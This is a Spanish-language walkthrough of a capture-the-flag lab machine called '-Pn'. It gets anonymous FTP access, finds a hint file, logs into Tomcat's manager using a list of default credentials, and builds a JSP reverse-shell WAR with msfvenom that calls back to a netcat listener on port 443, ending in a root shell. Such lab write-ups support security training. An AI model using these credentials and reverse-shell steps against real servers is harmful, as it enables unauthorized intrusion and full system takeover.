# Máquina -Pn

Lo primero es desplegar la máquina virtual con el siguiente comando.
```shell
bash auto_deploy.sh pn.tar
```

Copiamos la ip que nos da la máquina al desplegarla y realizamos el escaneo de puertos con este comando.
```shell
sudo nmap -sSCV -n -Pn --min-rate 5000 -p- --open 172.17.0.2
```

Como podemos observar tenemos abiertos tanto los puertos 21 y 8080

```shell
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack
8080/tcp open  http-proxy syn-ack
```
Con lo cual podemos observar que el puerto 21 tiene el servicio ftp.
Vamos a establecer conexión ftp.
```shell
> ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:kali): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> |
```

Ingresamos el comando (ls) para comprobar el contenido del lugar.
Vemos que tiene un archivo llamado tomcat.txt
```shell
ftp> ls
229 Entering Extended Passive Mode (I| |497671)
150 Here comes the directory listing.
-- r ---rw-r   1  0   0   74 Apr 19 07:32 tomcat.txt
226 Directory send OK.
ftp> |
```
Descargamos el archivo tomcat.txt mediante el comando get.

```shell
ftp> get tomcat.txt
local: tomcat. txt remote: tomcat.txt
229 Entering Extended Passive Mode (I| |441991)
150 Opening BINARY mode data connection for tomcat. txt (74 bytes).
100%
226 Transfer complete.
74 bytes received in 00:00 (283.39 KiB/s)
ftp> exit
221 Goodbye.
> ls
tomcat.txt whereismywebshell
> cat tomcat.txt
Hello tomcat, can you configure the tomcat server? I lost the password ...
```
Ahora vamos a comprobar la pagina que tiene el servidor mediante el comando whatweb [IP]
```shell
> whatweb 172.17.0.2:8080
```
Y este sería el resultado
```shell
http://172.17.0.2:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[172.17.0.2], Title[Apache Tomcat/9.0.88]
```
Vemos que aloja un servidor web, colocamos en el buscador la ip que en este caso sería 172.17.0.2:8080
- En la página web tenemos un apartado con un link para acceder al manager webapp.
- Hacemos click en ese link.
- Podemos ver que nos salta este formulario para introducir un usuario con su clave.

--------------------------------------------------------------------------------------------------

En un principio debemos probar con las contraseñas predeterminadas de Tomcat
- admin:admin
- tomcat:tomcat
- admin:
- admin:s3cr3t
- tomcat:s3cr3t
- admin:tomcat

En este caso fue usuario (tomcat) y password(s3cr3t)
Una vez dentro debemos crear un reverse shell con un archivo .war para conseguir el acceso a la máquina, para ello contamos con un comando para generar dicho archivo mediante el comando msfvenom.
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war
```
Vemos como se ha creado el archivo correctamente.
Ahora vamos a ponernos en escucha en el puerto 443.
```shell
> nc -lvnp 443
```
Ahora vamos a subir al servidor el archivo creado y establecemos una conexión la máquina víctima con privilegios de root.
```shell
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 59678
whoami
root
```






